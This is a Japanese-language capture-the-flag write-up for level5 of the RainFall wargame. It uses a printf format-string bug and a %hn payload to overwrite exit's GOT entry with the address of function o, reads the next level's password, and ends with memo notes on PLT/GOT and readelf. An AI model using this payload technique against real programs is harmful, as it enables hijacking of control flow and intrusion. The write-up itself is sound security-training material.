# level5

## 方針
これももprintfの問題だがlevel3,4と違いprintfでアドレスを書き換える必要がある。
そのため、got overwriteを行いexitのアドレスをoのアドレスに書き換える。

### oのアドレス
```
(gdb) p o
$1 = {<text variable, no debug info>} 0x80484a4 <o>
```

### exitのgotエントリ
```
level5@RainFall:~$ readelf -r ./level5
.....
08049838  00000607 R_386_JUMP_SLOT   00000000   exit
```

### 引数のスタックの位置を特定する
```
level5@RainFall:~$ ./level5
AAAA%p%p%p%p
AAAA0x2000xb7fd1ac00xb7ff37d00x41414141
```
printfの引数は4~にあることがわかる。

### ans
printfを使いgot　exit(0x08049838)のエントリをo(0x080484a4)に書き換える。

フィールド幅は減らすことができないから値が小さい方からいれていく。
4バイトそのまま入れるとstdoutが大きすぎるから処理に時間がかるため分割して入れる。
exit@gotとexit@got+2にそれぞれ2バイトずつ書き込むことで上位バイトと下位バイトに値を入れれる。
```
"\x38\x98\x04\x08" +  # exit@GOT (0x08049838)   4byte
"\x3a\x98\x04\x08" +  # exit@GOT+2 (0x0804983a) 4byte
"%2044x" +            # パディング（上位2バイト）8byte + 2044byte = 2052byte
"%5$hn" +             # 上位2バイト(0x0804(2052))をstackの５番目にある"\x3a\x98\x04\x08"に書き込む
"%31904x" +           # パディング（下位2バイト）2052byte + 31904byte = 33956byte
"%4$hn"               # 下位2バイト(0x84a4 (33956))をstackの4番目にある"\x38\x98\x04\x08"に書き込む

(python -c 'import sys; sys.stdout.write("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044x" + "%5$hn" + "%31904x" + "%4$hn")'; cat) | ./level5

cd /home/user/level6
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```


## memo

### plt got
- PLT (Procedure Linkage Table): 実行ファイルから直接呼ばれる． GOTから対応する共有ライブラリ関数のアドレスを取得し，間接ジャンプする．
- GOT (Global Offsets Table): 共有ライブラリ関数のアドレス一覧． 初回に関数が呼ばれた際にアドレスが設定される．
https://keichi.dev/post/plt-and-got/


### 動的リンクの流れ
exitを呼び出すと
exit@pltが実行される
pltは、gotのエントリをjmp *GOT[exit]で参照する
初回のgotエントリは特別で、pltの次の命令(リンカの呼び出し)を指している
つまり、初回呼び出しはリンカを呼び出す

リンカは、本物のexitのアドレスを調べて
gotのエントリを書き換える
書き換えた後、本物のexitを呼び出す

2回目以降はgotエントリが本物のexitのアドレスに更新されてる
pltは直接本物のexitにjmpするだけ

### got overwrite
got overwriteはgotのエントリをリンカ呼び出しや、本物の関数呼び出しを別のアドレスに書き換える。



### readelf -r
readelf は 1 つ以上の ELF フォーマットオブジェクトファイルに関する情報を表示します。 オプションでどの情報を表示するかを制御します。
-r ファイルが再配置セクションを持っている場合、その内容を表示します。
https://nxmnpg.lemoda.net/ja/1/readelf

つまり、readelf -rは再配置情報を表示してる。
_exitはsys_exit

### hn
h(ハーフ)下位２バイト